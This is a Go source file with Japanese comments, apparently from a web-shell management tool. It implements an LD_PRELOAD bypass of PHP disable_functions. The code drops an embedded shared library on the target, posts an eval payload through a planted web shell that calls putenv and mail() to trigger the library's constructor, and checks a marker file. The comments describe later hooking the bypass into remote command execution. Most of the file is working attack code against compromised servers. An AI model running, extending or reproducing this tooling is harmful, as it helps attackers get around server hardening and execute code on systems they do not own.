// bypass.go は内蔵 disable_functions バイパスプローブ(LD_PRELOAD 経路、振り返り R1 の修正 P0-1)。
//
// 原理(PHP eval シェルで exec 系がすべて無効、ただし mail()+putenv() が使える場合):
//
//	① WriteFile がプラットフォーム内蔵のコンパイル済み freestanding x86_64 .so を目標のランダムパスに投与する
//	   (.so に埋め込まれたパススロットは投与前に今回の疎通確認マーカーファイルのパスへ書き換える)。
//	② eval シェル内で putenv("LD_PRELOAD=<so>") の後に mail() を呼ぶ: mail() が起動する子プロセス
//	   (sendmail/sh)は動的リンクされた ELF で、ロード時に動的リンカがまず .so のコンストラクタを実行する。
//	③ コンストラクタは 1 つだけ仕事をする: マーカーファイルに 1 バイト書いて _exit(0)——最小限の「ロード即
//	   証明」で、コマンドは一切実行しない。eval プローブはその後 file_exists でコンストラクタが実際に走ったか判定する。
//
// 本ファイルは「プローブと登録」だけを行う: register_session は disable_functions:true、
// bypass:"ld_preload" を返す。session_exec からのバイパス実行は後続項目(導線: .so は目標側の
// BypassLib パスに残してあり、実行用の .so は別途用意する。コンストラクタ入口のプロトコルは本ファイルのパススロット書き換え
// 機構を踏襲する——投与前にコマンド/引数のパスをスロットへ書けばよい)。
//
// .so の成果物は session/ldpreloadgen(純 Go のオフライン生成器、ビルド期の外で `go run` して生成)
// が生成してリポジトリにコミットされ、go:embed でバイナリに取り込まれる。外部ツールチェーンへの依存は一切ない。
package session

import (
	"bytes"
	"context"
	"crypto/rand"
	_ "embed"
	"encoding/hex"
	"net/url"
	"strings"
	"time"
)

// ldpreloadSO はオフラインでコンパイル済みの freestanding x86_64 ELF 共有ライブラリ: コンストラクタは純粋な syscall
// (open/write/_exit)のみで、libc 依存はない。レイアウトと意味論は ldpreloadgen/main.go を参照。
//
//go:embed ldpreload_x86_64.so
var ldpreloadSO []byte

const (
	// ldpreloadMagic は .so 内のパススロットを特定する: magic の直後に ldpreloadPathLen バイトの
	// C 文字列スロットが続く(コンストラクタが open する目標パス。投与前に疎通確認マーカーファイルのパスへ書き換える)。
	ldpreloadMagic   = "ARTEXLDPATHv1\x00\x00\x00"
	ldpreloadPathLen = 128
	// bypassTriggerTimeout は mail() による発火プローブのタイムアウト(sendmail の起動は遅いことがある)。
	bypassTriggerTimeout = 30 * time.Second
)

// LDPreloadLib は内蔵 .so の読み取り専用コピーを返す(テストと生成器の検証用)。
func LDPreloadLib() []byte { return append([]byte(nil), ldpreloadSO...) }

// patchLDPreloadPath は .so 内のパススロットを markPath に書き換える(長さはスロット長未満であること。書き換え後は
// NUL 終端で残余をゼロ埋めし、残留を一切残さない)。
func patchLDPreloadPath(blob []byte, markPath string) ([]byte, error) {
	if markPath == "" || len(markPath) >= ldpreloadPathLen {
		return nil, opError("bypass", "疎通確認マーカーパスの不正(空、または長さ ≥ %d バイト)", ldpreloadPathLen)
	}
	i := bytes.Index(blob, []byte(ldpreloadMagic))
	if i < 0 {
		return nil, opError("bypass", "内蔵 .so にパスのプレースホルダがない(ビルド成果物の破損)")
	}
	out := append([]byte(nil), blob...)
	slot := out[i+len(ldpreloadMagic) : i+len(ldpreloadMagic)+ldpreloadPathLen]
	for j := range slot {
		slot[j] = 0
	}
	copy(slot, markPath)
	return out, nil
}

// randHex は n バイトの乱数の hex を生成する(2n 文字、目標側のランダムパス用)。
func randHex(n int) string {
	b := make([]byte, n)
	_, _ = rand.Read(b)
	return hex.EncodeToString(b)
}

// probeBypass は LD_PRELOAD バイパスプローブを実行し、info と s の bypass フィールドを埋める。
// exec 系がすべて無効かつ mail()+putenv() が利用可能な場合にのみ呼ばれる。プローブの失敗は登録を妨げない:
// 原因は info.BypassNote に正直に書く(誠実な意味論で、利用可能を偽装しない)。
func (s *HTTPShell) probeBypass(ctx context.Context, info *ProbeInfo) {
	soPath := defaultTmpPrefix + randHex(6) + ".so"
	markPath := defaultTmpPrefix + randHex(6) + ".mark"
	blob, err := patchLDPreloadPath(ldpreloadSO, markPath)
	if err != nil {
		info.BypassNote = err.Error()
		return
	}
	if err := s.WriteFile(ctx, soPath, blob); err != nil {
		info.BypassNote = ".so の投与に失敗しました(ファイル書き込み経路): " + err.Error()
		return
	}
	m := newSentinel()
	payload := `echo "` + m.start + `";` +
		`$so=base64_decode("` + b64e([]byte(soPath)) + `");` +
		`$mk=base64_decode("` + b64e([]byte(markPath)) + `");` +
		`if(!function_exists("putenv")||!function_exists("mail")){echo "NOBYPASS";}` +
		`else{@putenv("LD_PRELOAD=".$so);@mail("probe@localhost","p","p");` +
		`$ok=@file_exists($mk);@unlink($mk);echo ($ok?"BYPASSOK":"BYPASSFAIL");}` +
		`echo "\n` + m.end + `";`
	body, err := s.post(ctx, url.Values{s.password: {payload}}, bypassTriggerTimeout)
	if err != nil {
		info.BypassNote = "バイパス発火プローブの伝送に失敗しました: " + err.Error()
		s.cleanupFile(ctx, soPath)
		return
	}
	out, ok := m.extract(body)
	if !ok {
		info.BypassNote = "バイパス発火プローブのセンチネルがありません(WAF のブロック/書き換えの疑い)。エコー概要: " + excerpt(body, 200)
		s.cleanupFile(ctx, soPath)
		return
	}
	switch {
	case strings.Contains(out, "BYPASSOK"):
		s.bypass, s.bypassLib = "ld_preload", soPath
		info.Bypass, info.BypassLib = "ld_preload", soPath
		info.BypassNote = "コンストラクタの疎通確認: LD_PRELOAD バイパスが利用可能(.so は投与済みで記録も残る。" +
			"session_exec からのバイパス実行の接続は後続項目)"
	default:
		// NOBYPASS(mail/putenv が目標側で実際には使えない)と BYPASSFAIL(コンストラクタ未実行:
		// mail が子プロセスを起動しない/ローダが拒否/マーカーが書かれない)はまとめて正直に報告し、無用な .so を残さない。
		s.cleanupFile(ctx, soPath)
		if strings.Contains(out, "NOBYPASS") {
			info.BypassNote = "目標側で mail()/putenv() が実際には使えない(列挙プローブと不一致、実行時の差し替えの可能性)。バイパス不可"
		} else {
			info.BypassNote = "コンストラクタ未実行(mail() が子プロセスを起動しない/動的リンカが .so を拒否)。バイパス不可"
		}
	}
}

// cleanupFile は eval シェル経由で目標側のファイルを削除する(best-effort、失敗は黙って無視)。
func (s *HTTPShell) cleanupFile(ctx context.Context, path string) {
	m := newSentinel()
	payload := `echo "` + m.start + `";@unlink(base64_decode("` + b64e([]byte(path)) + `"));echo "\n` + m.end + `";`
	_, _ = s.post(ctx, url.Values{s.password: {payload}}, 0)
}
